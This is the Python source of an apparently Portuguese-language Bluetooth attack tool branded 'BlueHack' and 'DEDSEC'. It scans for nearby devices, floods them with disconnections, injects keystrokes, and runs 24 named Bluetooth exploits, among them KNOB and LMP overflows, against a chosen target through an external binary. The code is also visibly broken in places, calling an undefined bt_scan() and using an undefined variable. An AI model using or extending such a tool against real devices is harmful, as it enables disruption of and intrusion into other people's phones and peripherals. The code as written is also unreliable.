import os
import sys
import subprocess
import bluetooth
import pyautogui
import multiprocessing
from time import sleep
from datetime import datetime

try:
    import tabulate
except ImportError:
    print("Installing tabulate...")
    subprocess.run([sys.executable, "-m", "pip", "install", "tabulate"])
    import tabulate

try:
    import colorama
    from colorama import Fore, Style
    colorama.init()
except ImportError:
    print("Installing colorama...")
    subprocess.run([sys.executable, "-m", "pip", "install", "colorama"])
    import colorama
    from colorama import Fore, Style
    colorama.init()

try:
    import alive_progress
except ImportError:
    print("Installing alive-progress...")
    subprocess.run([sys.executable, "-m", "pip", "install", "alive-progress"])
    import alive_progress

try:
    tabulate.PRESERVE_WHITESPACE = True
except AttributeError:
    pass

def banner():
    print(Fore.YELLOW + '''
            --                                    
            =@#-                                  
            =@@@#-                                
            =@@@@@#-              *@#=.           
            =@@@@@@@#-             .=#@%=         
   .        =@@@#+@@@@#-        .      =@@=       
 .*@%-      =@@@* .+@@@@#-     .%@#=     +@%:     
 =%@@@%-    =@@@*   .%@@@@#      .=%@+    .%@-    
   =%@@@%-  =@@@*  =%@@@%=   ::     -@@-    %@-   
     +%@@@%-=@@@#=%@@@%=     +@@*.   .%@-   .@@   
       =%@@@@@@@@@@@%=         -%@-   .@@.   +@+  
         =%@@@@@@@%=             %@.   +@+   :@%  
          .%@@@@@#               *@=   -@*   .@@  
         =%@@@@@@@%-             %@:   +@+   :@%  
       =%@@@@@@@@@@@%-         :%@=   .@@.   +@+  
     =%@@@%==@@@#=%@@@%-     +%@#:    %@=   .@@.  
   =%@@@%=  =@@@*  =%@@@%-   :-     -%@-    %@-   
 =%@@@%=    =@@@*   .%@@@@#       =%@*.   .%@=    
 :*@%=      =@@@*  +%@@@%-     .%@#=.    =@%:     
   .        =@@@#+@@@@%-        :      =%@+       
            =@@@@@@@%-             .-*@%+         
            =@@@@@%-              *@%+:           
            =@@@%-                                
            =@%-                                  
            :-                                 ''' + Style.RESET_ALL)

def exibir_opcoes():
    print("Opções disponíveis:")
    print("1. Exibir dispositivos locais")
    print("2. Consultar dispositivos remotos (exibe endereço, offset de clock e classe)")
    print("3. Consultar dispositivos remotos (exibe nome do dispositivo)")
    print("4. Exibir nome do dispositivo remoto com o endereço bdaddr")
    print("5. Exibir nome, versão e recursos suportados do dispositivo remoto com o endereço bdaddr")
    print("6. Iniciar processo de consulta periódica (sem exibir resultados)")
    print("7. Encerrar processo de consulta periódica")
    print("8. Realizar o flood de desconexão em um dispositivo específico")
    print("9. Realizar o flood de desconexão em todos os dispositivos próximos")
    print("10. Desconectar um dispositivo específico e se conectar a ele")
    print("11. Enviar keystrokes para dispositivo")
    print("12. Rescan de dispositivos")
    print("0. Sair")

def executar_comando(args):
    try:
        output = subprocess.check_output(["hciconfig"] + args, text=True)
        print(output)
    except subprocess.CalledProcessError as e:
        print("Ocorreu um erro ao executar o comando:", e)

def get_device_ip():
    device_ip = subprocess.check_output(["hostname", "-I"], text=True).strip()
    return device_ip

def flood_disconnect_single(device_address):
    try:
        sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
        sock.connect((device_address, 1))
        sock.close()
        print(f"Dispositivo {device_address} desconectado com sucesso.")
    except Exception as e:
        print(f"Erro ao desconectar dispositivo {device_address}: {str(e)}")

def disconnect_device(device_address):
    try:
        subprocess.run(["hcitool", "dc", device_address], check=True)
        print(f"Dispositivo {device_address} desconectado com sucesso.")
    except subprocess.CalledProcessError as e:
        print(f"Erro ao desconectar dispositivo {device_address}: {str(e)}")

def enviar_keystrokes(device_address, keystrokes):
    try:
        subprocess.run(["bluetoothctl", "trust", device_address], check=True)
        subprocess.run(["bluetoothctl", "connect", device_address], check=True)
        print(f"Conectado ao dispositivo {device_address} com sucesso.")
        pyautogui.typewrite(keystrokes)
    except subprocess.CalledProcessError as e:
        print(f"Erro ao se conectar ao dispositivo {device_address}: {str(e)}")

def bt_scanner():
    with alive_progress.alive_bar(390, title='SCANNING') as bar:
        for i in range(390):
            sleep(0.03)
            bar()

    os.system('sudo bin/bt_dedsec --host-port=/dev/ttyUSB1 --scan | grep "BDAddress:" > .logs.txt')

    with open('.logs.txt', 'r') as f, open('.str.txt', 'w') as out:
        dd = 0
        for line in f:
            if '[ESP32BT]' in line:
                bdaddress = line.split('BDAddress: ')[1].split(', ')[0]
                name = line.split('Name: ')[1].split(', ')[0] if ', Name:' in line else 'None'
                rssi = line.split('RSSI: ')[1].split(', ')[0]
                class_ = line.split('Class: ')[1].strip()
                dd += 1
                out.write(f"{dd}, {bdaddress}, {name}, {rssi}, {class_}\n")

    if os.path.exists('.str.txt'):
        with open('.str.txt', 'r') as f:
            format = []
            headers = ['NO', 'BSSID', 'NAME', 'RSSI', 'TYPE', 'TIME']
            format.append(headers)
            data_found = False
            for line in f:
                id_no = line.split(', ')[0]
                mac_address = line.split(', ')[1]
                name = line.split(', ')[2]
                rssi = line.split(', ')[3]
                class_ = line.split(', ')[4].strip()
                format.append([id_no, mac_address, name, rssi, class_, fortime])
                data_found = True
            os.system('clear')
            if data_found:
                print(tabulate.tabulate(format, tablefmt='fancy_grid'))
            else:
                print(tabulate.tabulate([['NO BLUETOOTH DEVICE FOUND']], tablefmt='fancy_grid'))

    print(tabulate.tabulate([['1. RESCAN', '2. ATTACK', '3. MENU']], tablefmt='fancy_grid'))
    select = int(input(': '))
    if select == 1:
        os.system('clear')
        bt_scanner()
    elif select == 2:
        main_attack()
    elif select == 3:
        os.system('clear')
        banner()
        menu()

def exploit_list():
    os.system('clear')
    print(tabulate.tabulate([['EXPLOIT LIST', 'DEDSEC']], tablefmt='fancy_grid'))
    text_format = [['1. feature_response_flooding', '13. lmp_max_slot_overflow'],
                   ['2. duplicated_iocap', '14. invalid_feature_page_execution'],
                   ['3. lmp_invalid_transport', '15. invalid_timing_accuracy'],
                   ['4. truncated_sco_link_request', '16. au_rand_flooding'],
                   ['5. lmp_auto_rate_overflow', '17. noncomplicance_duplicated_encryption_reques'],
                   ['6. sdp_unkown_element_type', '18. repeated_host_connection'],
                   ['7. sdp_oversized_element_size', '19. knob'],
                   ['8. invalid_max_slot', '20. truncated_lmp_accepted'],
                   ['9. feature_req_ping_pong', '21. duplicated_encapsulated_payload'],
                   ['10. lmp_overflow_dm1', '22. paging_scan_disable'],
                   ['11. invalid_setup_complete', '23. wrong_encapsulated_payload'],
                   ['12. noncompliance_invalid_stop_encryption', '24. lmp_overflow_2dh1'],
                   ['25. MENU']]
    print(tabulate.tabulate(text_format, tablefmt='fancy_grid'))
    select = int(input(': '))
    if select == 25:
        os.system('clear')
        banner()
        menu()
    else:
        exploit_pref(select)
        os.system(f'sudo bin/bt_dedsec --host-port=/dev/ttyUSB1 --target="{res}" --exploit="{exploit_res}"')
        os.system('clear')
        banner()
        menu()

def about():
    os.system('clear')
    about_format = [['ABOUT', 'DEDSEC'],
                   ['BlueHack  BY: Wrench', ''],
                   ['GITHUB ACCOUNT: https://github.com/Jeanpseven', '']]
    print(tabulate.tabulate(about_format, tablefmt='fancy_grid'))
    print(tabulate.tabulate([['1. MENU']], tablefmt='fancy_grid'))
    select = int(input(': '))
    if select == 1:
        os.system('clear')
        banner()
        menu()
    else:
        banner()
        os.system('clear')
        menu()

def exploit_pref(num):
    try:
        list_Exp = [' ',
                    'feature_response_flooding',
                    'duplicated_iocap',
                    'lmp_invalid_transport',
                    'truncated_sco_link_request',
                    'lmp_auto_rate_overflow',
                    'sdp_unkown_element_type',
                    'sdp_oversized_element_size',
                    'invalid_max_slot',
                    'feature_req_ping_pong',
                    'lmp_overflow_dm1',
                    'invalid_setup_complete',
                    'noncompliance_invalid_stop_encryption',
                    'lmp_max_slot_overflow',
                    'invalid_feature_page_execution',
                    'invalid_timing_accuracy',
                    'au_rand_flooding',
                    'noncomplicance_duplicated_encryption_request',
                    'repeated_host_connection',
                    'knob',
                    'truncated_lmp_accepted',
                    'duplicated_encapsulated_payload',
                    'paging_scan_disable',
                    'wrong_encapsulated_payload',
                    'lmp_overflow_2dh1'
                    ]
        global exploit_res
        exploit_res = (list_Exp[num])
    except IndexError:
        os.system('clear')
        print('EXPLOIT (NO) not found!')
        sleep(2)
        main_attack()
    except NameError:
        os.system('clear')
        print('EXPLOIT (NO) not found!')
        sleep(2)
        main_attack()

def select_target(user_input):
    with open('.str.txt', 'r') as f:
        lines = f.readlines()
    for line in lines:
        fields = line.strip().split(', ')
        if fields[0] == user_input:
            global res
            res = (fields[1])
            break

def main_attack():
    try:
        bt_scan()
        macaddr = input(' NO: ')
        select_target(macaddr)
        exploit_list()
    except KeyboardInterrupt:
        sys.exit('Bye and remember,we are DEDSEC')
    except NameError:
        os.system('clear')
        print('TARGET (NO) not found')
        sleep(2)
        main_attack()

def menu():
    text_format = [['1. SCAN BLUETOOTH DEVICE', '2. EXPLOIT LIST'],
                   ['3. ATTACK', '4. ABOUT'],
                   ['0. EXIT', '|||||DEDSEC|||||']]
    print(tabulate.tabulate(text_format, tablefmt='fancy_grid'))
    select = int(input(' root@dedsec: '))
    if select == 1:
        bt_scanner()
    elif select == 2:
        exploit_list()
    elif select == 3:
        main_attack()
    elif select == 4:
        about()
    elif select == 0:
        os.system('clear')
        sys.exit('BYE BYE')

os.system('clear')
banner()
menu()
